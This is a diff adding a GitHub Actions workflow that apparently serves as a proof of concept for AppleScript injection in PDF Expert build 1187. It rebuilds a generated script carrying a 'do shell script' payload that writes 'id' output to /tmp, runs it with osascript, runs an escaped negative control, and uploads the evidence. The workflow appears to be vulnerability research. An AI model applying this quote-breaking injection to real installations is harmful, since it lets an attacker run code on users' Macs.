@@ -1,0 +1,76 @@
+name: pdfexpert-poc
+
+on:
+  workflow_dispatch:
+
+jobs:
+  poc:
+    runs-on: macos-14
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Host
+        run: sw_vers; uname -m
+
+      - name: Fetch PDF Expert 1187 from the vendor feed
+        run: |
+          set -euo pipefail
+          curl -fsSL -o pex.zip https://downloads.pdfexpert.com/pem3/versions/1187/PDFExpert.zip
+          ls -l pex.zip
+          shasum -a 256 pex.zip | tee zip.sha256
+          unzip -q pex.zip -d app
+          ls -l "app/PDF Expert.app/Contents/MacOS/"
+
+      - name: Re-derive the template literals from the shipped bytes
+        run: python3 poc/verify_binary.py "app/PDF Expert.app/Contents/MacOS/PDF Expert"
+
+      - name: Rebuild the exact script the app generates and tokenize it
+        run: python3 poc/gen_poc.py --cmd "id > /tmp/pdfe_pwned" --field body > generated.scpt
+             && cat generated.scpt
+             && python3 poc/verify_tokenlevel.py generated.scpt
+
+      - name: Execute with the engine NSAppleScript drives
+        run: |
+          set +e
+          rm -f /tmp/pdfe_pwned
+          osascript generated.scpt > osa.out 2>&1 &
+          PID=$!
+          for i in $(seq 1 20); do [ -s /tmp/pdfe_pwned ] && break; sleep 1; done
+          kill $PID 2>/dev/null
+          echo "--- osascript output ---"; cat osa.out
+          echo "--- marker ---"; cat /tmp/pdfe_pwned 2>/dev/null
+          if [ -s /tmp/pdfe_pwned ]; then echo "PROOF: do shell script executed"; else echo "NO PROOF"; fi
+
+      - name: Negative control (escape the quote, expect no execution)
+        run: |
+          set +e
+          rm -f /tmp/pdfe_ctl
+          python3 - <<'PY' > ctl.scpt
+          q = lambda v: '"' + v.replace('"', '\\"') + '"'
+          print('tell application "Mail"')
+          print('set newMessage to make new outgoing message with properties {subject:' + q('x" & do shell script "id > /tmp/pdfe_ctl" & "') + '}')
+          print('end tell')
+          PY
+          cat ctl.scpt
+          osascript ctl.scpt > ctl.out 2>&1 &
+          PID=$!
+          for i in $(seq 1 10); do [ -s /tmp/pdfe_ctl ] && break; sleep 1; done
+          kill $PID 2>/dev/null
+          echo "--- control output ---"; cat ctl.out
+          if [ -s /tmp/pdfe_ctl ]; then echo "CONTROL FAILED (escaped payload still executed)"; else echo "CONTROL OK: escaped payload did not execute"; fi
+
+      - name: Collect
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: pdfexpert-poc-evidence
+          path: |
+            generated.scpt
+            ctl.scpt
+            osa.out
+            ctl.out
+            zip.sha256
+            /tmp/pdfe_pwned
+            /tmp/pdfe_ctl
+          if-no-files-found: warn
